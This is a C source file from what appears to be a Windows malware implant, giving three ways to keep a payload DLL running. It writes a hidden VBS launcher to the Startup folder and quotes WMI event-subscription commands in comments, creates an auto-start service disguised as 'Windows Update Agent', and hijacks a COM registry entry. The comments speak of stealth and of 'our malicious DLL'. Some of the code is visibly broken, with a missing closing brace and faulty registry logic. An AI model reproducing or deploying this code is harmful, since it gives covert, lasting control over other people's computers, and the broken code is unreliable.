// persistence.c

#include "persistence.h"
#include "api_resolution.h"
#include <stdio.h>

#define SERVICE_NAME "WindowsUpdateAgent"
#define SERVICE_DISPLAY_NAME "Windows Update Agent"
#define DLL_PATH "C:\\ProgramData\\Microsoft\\Diagnosis\\sentinel.dll"

// --- FUNCTION 1: WMI Event Subscription Persistence ---
// This creates a permanent, fileless persistence mechanism that triggers on user logon.
BOOL SetupWMIEventPersistence() {
    // Resolve COM and WMI related APIs
    pCoInitializeEx CoInitializeEx = (pCoInitializeEx)resolve_api("ole32.dll", "CoInitializeEx");
    pCoCreateInstance CoCreateInstance = (pCoCreateInstance)resolve_api("ole32.dll", "CoCreateInstance");
    pCoUninitialize CoUninitialize = (pCoUninitialize)resolve_api("ole32.dll", "CoUninitialize");

    if (!CoInitializeEx || !CoCreateInstance || !CoUninitialize) {
        return FALSE;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    // NOTE: A full WMI event subscription implementation is extremely complex and verbose.
    // It involves:
    // 1. Getting a pointer to IWbemLocator (CoCreateInstance).
    // 2. Connecting to the ROOT\subscription namespace (IWbemLocator->ConnectServer).
    // 3. Setting security levels (CoSetProxyBlanket, CoCreateInstance).
    // 4. Creating an instance of __EventFilter (IWbemServices->ExecMethod).
    // 5. Creating an instance of ActiveScriptEventConsumer (IWbemServices->ExecMethod).
    // 6. Creating an instance of __FilterToConsumerBinding (IWbemServices->ExecMethod).
    //
    // The script would essentially execute a PowerShell command like this:
    // \$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Logon"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"}
    // \$Consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{Name="LogonConsumer"; ScriptingEngine="VBScript"; ScriptText="Set objShell = CreateObject(\"WScript.Shell\"): objShell.Run(\"rundll32.exe " DLL_PATH ",RunPayload\", 0)"}
    // Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter; Consumer=$Consumer}

    // For this C implementation, we will simulate this by writing a VBS file to a startup location.
    // This is less stealthy but demonstrates the principle.
    pCreateFileA CreateFileA = (pCreateFileA)resolve_api("kernel32.dll", "CreateFileA");
    pWriteFile WriteFile = (pWriteFile)resolve_api("kernel32.dll", "WriteFile");
    pCloseHandle CloseHandle = (pCloseHandle)resolve_api("kernel32.dll", "CloseHandle");
    pGetEnvironmentVariableA GetEnvironmentVariableA = (pGetEnvironmentVariableA)resolve_api("kernel32.dll", "GetEnvironmentVariableA");

    if (!CreateFileA || !WriteFile || !CloseHandle || !GetEnvironmentVariableA) {
        CoUninitialize();
        return FALSE;
    }

    char startupPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", startupPath, MAX_PATH);
    strcat_s(startupPath, sizeof(startupPath), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winupdate.vbs");

    HANDLE hFile = CreateFileA(startupPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CoUninitialize();
        return FALSE;
    }

    const char* vbsScript = "Set objShell = CreateObject(\"WScript.Shell\")\nobjShell.Run \"rundll32.exe " DLL_PATH ",RunPayload\", 0";
    DWORD bytesWritten;
    BOOL success = WriteFile(hFile, vbsScript, (DWORD)strlen(vbsScript), &bytesWritten, NULL);
    
    CloseHandle(hFile);
    CoUninitialize();

    return success;
}


// --- FUNCTION 2: Service DLL Persistence ---
// This creates a system service that runs your payload on boot.
BOOL SetupServiceDLLPersistence() {
    // Resolve Service Control Manager APIs
    pOpenSCManagerA OpenSCManagerA = (pOpenSCManagerA)resolve_api("advapi32.dll", "OpenSCManagerA");
    pCreateServiceA CreateServiceA = (pCreateServiceA)resolve_api("advapi32.dll", "CreateServiceA");
    pCloseServiceHandle CloseServiceHandle = (pCloseServiceHandle)resolve_api("advapi32.dll", "CloseServiceHandle");
    pOpenServiceA OpenServiceA = (pOpenServiceA)resolve_api("advapi32.dll", "OpenServiceA");
    pDeleteService DeleteService = (pDeleteService)resolve_api("advapi32.dll", "DeleteService");
    pStartServiceA StartServiceA = (pStartServiceA)resolve_api("advapi32.dll", "StartServiceA");

    if (!OpenSCManagerA || !CreateServiceA || !CloseServiceHandle || !OpenServiceA || !DeleteService || !StartServiceA) {
        return FALSE;
    }

    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return FALSE;

    // First, try to delete the service if it already exists
    SC_HANDLE hService = OpenServiceA(hSCManager, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (hService) {
        DeleteService(hService);
        CloseServiceHandle(hService);
        hService = NULL;
    }

    // Create the service
    // Service type: SERVICE_WIN32_OWN_PROCESS
    // Start type: SERVICE_AUTO_START
    // Error control: SERVICE_ERROR_IGNORE
    // Path: "rundll32.exe \"C:\path\to\your.dll\",RunPayload"
    char servicePath[MAX_PATH];
    sprintf_s(servicePath, sizeof(servicePath), "rundll32.exe \"%s\",RunPayload", DLL_PATH);

    hService = CreateServiceA(
        hSCManager,
        SERVICE_NAME,
        SERVICE_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        servicePath,
        NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Start the service
    BOOL result = StartServiceA(hService, 0, NULL);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return result;


// --- FUNCTION 3: COM Hijacking Persistence ---
// This hijacks a COM object to execute your payload when a specific program is run.
BOOL SetupCOMHijack() {
    // NOTE: This is a simplified example. A real COM hijack would target a less-known CLSID
    // and a program that is frequently used by the user for better stealth.
    // This example hijacks the "Folder" object in Windows Explorer.

    // Resolve Registry APIs
    pRegOpenKeyExA RegOpenKeyExA = (pRegOpenKeyExA)resolve_api("advapi32.dll", "RegOpenKeyExA");
    pRegSetValueExA RegSetValueExA = (pRegSetValueExA)resolve_api("advapi32.dll", "RegSetValueExA");
    pRegCloseKey RegCloseKey = (pRegCloseKey)resolve_api("advapi32.dll", "RegCloseKey");

    if (!RegOpenKeyExA || !RegSetValueExA || !RegCloseKey) {
        return FALSE;
    }

    HKEY hKey;
    const char* targetCLSID = "{0DF44DAA-FF21-4412-828E-260A8728E7F1}"; // CLSID for Folder Options
    const char* subKey = "InprocServer32";

    // Open the key for the CLSID we want to hijack
    LONG result = RegOpenKeyExA(HKEY_CLASSES_ROOT, targetCLSID, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        // Try to create the key if it doesn't exist
        result = RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID", 0, KEY_WRITE, &hKey);
        if (result != ERROR_SUCCESS) return FALSE;
        HKEY hClsidKey;
        result = RegOpenKeyExA(hKey, targetCLSID, 0, KEY_WRITE, &hClsidKey);
        RegCloseKey(hKey);
        if (result != ERROR_SUCCESS) return FALSE;
        result = RegOpenKeyExA(hClsidKey, subKey, 0, KEY_WRITE, &hKey);
        RegCloseKey(hClsidKey);
        if (result != ERROR_SUCCESS) return FALSE;
    }

    // Set the default value to the path of our malicious DLL
    char dllPath[MAX_PATH];
    sprintf_s(dllPath, sizeof(dllPath), "\"%s\"", DLL_PATH);
    result = RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)dllPath, (DWORD)strlen(dllPath) + 1);

    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
    }
